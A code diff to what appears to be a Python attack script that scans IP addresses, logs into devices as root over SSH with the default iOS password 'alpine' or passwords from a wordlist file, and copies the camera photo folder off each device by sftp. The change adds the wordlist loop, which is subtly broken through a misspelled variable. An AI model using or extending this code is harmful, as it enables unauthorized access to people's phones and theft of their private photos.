@@ -91,7 +91,12 @@ for f in All_ip:
         if s.connect_ex((host, port)):
             pass
         else:
-            Password = "alpine"
+            file = open("password.txt", "r")
+            lines = file.readlines()
+            # print(type(lines))
+            # print(lines)
+            for Password in lines:
+                Passowrd = str(Password).strip()
             str(subprocess.run(
                 ["sshpass", "-p", Password, "ssh", "-o StrictHostKeyChecking=no", f"root@{host}"]))
             os.system("clear")
@@ -100,5 +105,6 @@ for f in All_ip:
             str(subprocess.run(
                 ["sshpass", "-p", Password, "sftp", "-r",
                  f"root@{host}:/var/mobile/Media/DCIM/100APPLE/ %s" % options.path]))
+            exit()
     except:
         pass
